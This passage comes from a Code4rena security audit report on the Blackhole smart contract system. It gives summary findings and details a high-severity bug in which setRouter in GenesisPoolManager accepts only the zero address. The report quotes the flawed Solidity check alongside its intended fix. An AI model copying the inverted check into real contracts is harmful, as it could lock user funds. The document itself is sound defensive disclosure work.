__variable_38ceec\",\"children\":[\"$\",\"body\",null,{\"children\":[\"$\",\"$L11\",null,{\"hasLoginHistory\":false,\"children\":[\"$\",\"$L9\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[\"$\",\"$L12\",null,{}],\"notFoundStyles\":[]}]}]}]}]\n15:Te52f9,"])</script><script>self.__next_f.push([1,"\u003ch1 id=\"overview\" style=\"position:relative;\"\u003e\u003ca href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eOverview\u003c/h1\u003e\n\u003ch2 id=\"about-c4\" style=\"position:relative;\"\u003e\u003ca href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eAbout C4\u003c/h2\u003e\n\u003cp\u003eCode4rena (C4) is a competitive audit platform where security researchers, referred to as Wardens, review, audit, and analyze codebases for security vulnerabilities in exchange for bounties provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eA C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eDuring the audit outlined in this document, C4 conducted an analysis of the Blackhole smart contract system. The audit took place from May 28 to June 09, 2025.\u003c/p\u003e\n\u003cp\u003eFollowing the C4 audit, 3 wardens (\u003ca href=\"https://code4rena.com/@rayss\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/@lonelybones\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/@maxzuvex\"\u003emaxzuvex\u003c/a\u003e) reviewed the mitigations for all identified issues; the \u003ca href=\"#mitigation-review\"\u003emitigation review report\u003c/a\u003e is appended below the audit report.\u003c/p\u003e\n\u003cp\u003eFinal report assembled by Code4rena.\u003c/p\u003e\n\u003ch1 id=\"summary\" style=\"position:relative;\"\u003e\u003ca href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSummary\u003c/h1\u003e\n\u003cp\u003eThe C4 analysis yielded an aggregated total of 24 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 22 received a risk rating in the category of MEDIUM severity.\u003c/p\u003e\n\u003cp\u003eAdditionally, C4 analysis included 13 reports detailing issues with a risk rating of LOW severity or non-critical. \u003c/p\u003e\n\u003cp\u003eAll of the issues presented here are linked back to their original finding, which may include relevant context from the judge and Blackhole team.\u003c/p\u003e\n\u003ch2 id=\"governor-findings\" style=\"position:relative;\"\u003e\u003ca href=\"#governor-findings\" aria-label=\"governor findings permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eGovernor findings\u003c/h2\u003e\n\u003cp\u003eOf the identified vulnerabilities, 5 medium severity findings were associated with the Governor contracts.\u003c/p\u003e\n\u003cp\u003e⚠️ The Blackhole team has decided not to deploy a governor contract at this time. \u003c/p\u003e\n\u003cp\u003eThe sponsors have requested the following note be included:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eBlackhole has chosen not to deploy a governor contract at this stage. A more advanced version will be introduced later as per the roadmap, subject to a separate audit.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eC4 has included the related findings as a \u003ca href=\"#governor\"\u003eseparate section\u003c/a\u003e in this report. Original numbering is in continuous order for this section, for ease of reference.\u003c/p\u003e\n\u003ch1 id=\"scope\" style=\"position:relative;\"\u003e\u003ca href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eScope\u003c/h1\u003e\n\u003cp\u003eThe code under review can be found within the \u003ca href=\"https://github.com/code-423n4/2025-05-audit-507\"\u003eC4 Blackhole repository\u003c/a\u003e, and is composed of 116 smart contracts written in the Solidity programming language and includes 10,108 lines of Solidity code.\u003c/p\u003e\n\u003ch1 id=\"severity-criteria\" style=\"position:relative;\"\u003e\u003ca href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSeverity Criteria\u003c/h1\u003e\n\u003cp\u003eC4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.\u003c/p\u003e\n\u003cp\u003eHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMalicious Input Handling\u003c/li\u003e\n\u003cli\u003eEscalation of privileges\u003c/li\u003e\n\u003cli\u003eArithmetic\u003c/li\u003e\n\u003cli\u003eGas use\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eFor more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on \u003ca href=\"https://code4rena.com\"\u003ethe C4 website\u003c/a\u003e, specifically our section on \u003ca href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\"\u003eSeverity Categorization\u003c/a\u003e.\u003c/p\u003e\n\u003ch1 id=\"high-risk-findings-2\" style=\"position:relative;\"\u003e\u003ca href=\"#high-risk-findings-2\" aria-label=\"high risk findings 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eHigh Risk Findings (2)\u003c/h1\u003e\n\u003ch2 id=\"h-01-router-address-validation-logic-error-prevents-valid-router-assignment\" style=\"position:relative;\"\u003e\u003ca href=\"#h-01-router-address-validation-logic-error-prevents-valid-router-assignment\" aria-label=\"h 01 router address validation logic error prevents valid router assignment permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-86\"\u003e[H-01] Router address validation logic error prevents valid router assignment\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-245\"\u003efrancoHacker\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-243\"\u003eAvantGard\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-397\"\u003edreamcoder\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-46\"\u003eEgbe\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-319\"\u003eFavourOkerri\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-489\"\u003eharsh123\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-244\"\u003eholtzzx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-479\"\u003eIzuMan\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-506\"\u003eNexusAudits\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-293\"\u003erayss\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-529\"\u003eSparrow\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L314\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L314\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description\" aria-label=\"finding description permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003esetRouter(address _router)\u003c/code\u003e function within the \u003ccode\u003eGenesisPoolManager\u003c/code\u003e contract is intended to allow the contract owner (\u003ccode\u003eowner\u003c/code\u003e) to modify the address of the \u003ccode\u003erouter\u003c/code\u003e contract. This router is crucial for interacting with the decentralized exchange (DEX) when adding liquidity during the launch of a \u003ccode\u003eGenesisPool\u003c/code\u003e. However, the function contains a logical flaw in its \u003ccode\u003erequire\u003c/code\u003e statement:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// \u0026lt;\u0026lt;\u0026lt; LOGICAL ERROR HERE\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe line \u003ccode\u003erequire(_router == address(0), \"ZA\");\u003c/code\u003e currently mandates that the \u003ccode\u003e_router\u003c/code\u003e address provided as an argument \u003cem\u003emust be\u003c/em\u003e the zero address (\u003ccode\u003eaddress(0)\u003c/code\u003e). If any other address (i.e., a valid, non-zero router address) is supplied, the condition \u003ccode\u003e_router == address(0)\u003c/code\u003e will evaluate to false, and the transaction will revert with the error message “ZA” (presumably “Zero Address”).\u003c/p\u003e\n\u003cp\u003eThis means the \u003ccode\u003esetRouter\u003c/code\u003e function’s behavior is inverted from what its name and intended purpose imply:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCurrent Behavior:\u003c/strong\u003e It only allows the \u003ccode\u003eowner\u003c/code\u003e to set the \u003ccode\u003erouter\u003c/code\u003e state variable to \u003ccode\u003eaddress(0)\u003c/code\u003e. It does not permit updating it to a new, functional router address.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExpected Behavior (based on name and usage):\u003c/strong\u003e It should allow the \u003ccode\u003eowner\u003c/code\u003e to set the \u003ccode\u003erouter\u003c/code\u003e state variable to a new, valid, non-zero router address, likely with a check ensuring \u003ccode\u003e_router\u003c/code\u003e is not \u003ccode\u003eaddress(0)\u003c/code\u003e (i.e., \u003ccode\u003erequire(_router != address(0), \"ZA\");\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"root-cause\" style=\"position:relative;\"\u003e\u003ca href=\"#root-cause\" aria-label=\"root cause permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRoot Cause\u003c/h3\u003e\n\u003cp\u003eThe root cause of the issue is an incorrect condition in the \u003ccode\u003erequire\u003c/code\u003e statement. The developer likely intended either to ensure a non-null router address was not being set (if such a check was desired for some specific reason, though unlikely for a setter) or, probably, to ensure a non-null address \u003cem\u003ewas\u003c/em\u003e being set. Instead, the implemented condition only permits setting a null address.\u003c/p\u003e\n\u003ch3 id=\"impact\" style=\"position:relative;\"\u003e\u003ca href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eThe impact of this logical error is significant and can lead to several adverse consequences:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eInability to update the router to a functional address:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIf the \u003ccode\u003erouter\u003c/code\u003e address is initially set during the \u003ccode\u003eGenesisPoolManager\u003c/code\u003e contract’s initialization (via the \u003ccode\u003einitialize\u003c/code\u003e function) and subsequently needs to be changed (e.g., due to a DEX router upgrade, an error in the initial configuration, or the deployment of a new router version), the current \u003ccode\u003esetRouter\u003c/code\u003e function will prevent this update to a functional address. The \u003ccode\u003eowner\u003c/code\u003e would only be able to “clear” the router address by setting it to \u003ccode\u003eaddress(0)\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003ePotential blocking of new pool launches (\u003ccode\u003e_launchPool\u003c/code\u003e):\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe internal \u003ccode\u003e_launchPool\u003c/code\u003e function in \u003ccode\u003eGenesisPoolManager\u003c/code\u003e is responsible for finalizing a \u003ccode\u003eGenesisPool\u003c/code\u003e’s process and adding liquidity. This function calls \u003ccode\u003eIGenesisPool(_genesisPool).launch(router, MATURITY_TIME)\u003c/code\u003e, passing the \u003ccode\u003erouter\u003c/code\u003e address stored in \u003ccode\u003eGenesisPoolManager\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eIf the \u003ccode\u003erouter\u003c/code\u003e address in \u003ccode\u003eGenesisPoolManager\u003c/code\u003e is \u003ccode\u003eaddress(0)\u003c/code\u003e (either because it was mistakenly set that way initially or because the \u003ccode\u003eowner\u003c/code\u003e used \u003ccode\u003esetRouter\u003c/code\u003e to “clear” it), the call to \u003ccode\u003eIGenesisPool.launch\u003c/code\u003e will attempt to interact with an \u003ccode\u003eIRouter(address(0))\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eFunction calls to \u003ccode\u003eaddress(0)\u003c/code\u003e typically fail or behave unpredictably (depending on low-level Solidity/EVM implementation details, but practically, they will fail when trying to execute non-existent code or decode empty return data). This will cause the \u003ccode\u003eGenesisPool\u003c/code\u003e’s \u003ccode\u003elaunch\u003c/code\u003e function to fail, and consequently, the \u003ccode\u003eGenesisPoolManager\u003c/code\u003e’s \u003ccode\u003e_launchPool\u003c/code\u003e function will also fail.\u003c/li\u003e\n\u003cli\u003eAs a result, no new \u003ccode\u003eGenesisPool\u003c/code\u003e reaching the launch stage can be successfully launched if the router address is \u003ccode\u003eaddress(0)\u003c/code\u003e. Funds intended for liquidity (both \u003ccode\u003enativeToken\u003c/code\u003e and \u003ccode\u003efundingToken\u003c/code\u003e) could become locked in the \u003ccode\u003eGenesisPool\u003c/code\u003e contract indefinitely, or until an alternative solution is implemented (if possible via governance or contract upgradeability).\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDependency on correct initial configuration:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe system becomes overly reliant on the \u003ccode\u003erouter\u003c/code\u003e address being perfectly configured during the \u003ccode\u003einitialize\u003c/code\u003e call. If there’s a typo or an incorrect address is provided, there is no way to correct it via \u003ccode\u003esetRouter\u003c/code\u003e unless the contract is upgradeable and the \u003ccode\u003esetRouter\u003c/code\u003e logic itself is updated.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMisleading functionality:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe function name \u003ccode\u003esetRouter\u003c/code\u003e is misleading, as it doesn’t “set” a functional router but rather only “clears” it (sets it to \u003ccode\u003eaddress(0)\u003c/code\u003e). This can lead to administrative errors and confusion.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"severity\" style=\"position:relative;\"\u003e\u003ca href=\"#severity\" aria-label=\"severity permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSeverity\u003c/h3\u003e\n\u003cp\u003eHigh. Although the function is only accessible by the \u003ccode\u003eowner\u003c/code\u003e, its malfunction directly impacts a core functionality of the system (pool launching and liquidity provision). If the router needs to be changed or is misconfigured, this vulnerability can halt a critical part of the protocol.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eThe condition in the \u003ccode\u003esetRouter\u003c/code\u003e function must be corrected to allow setting a non-null router address. The more common and expected logic would be:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan 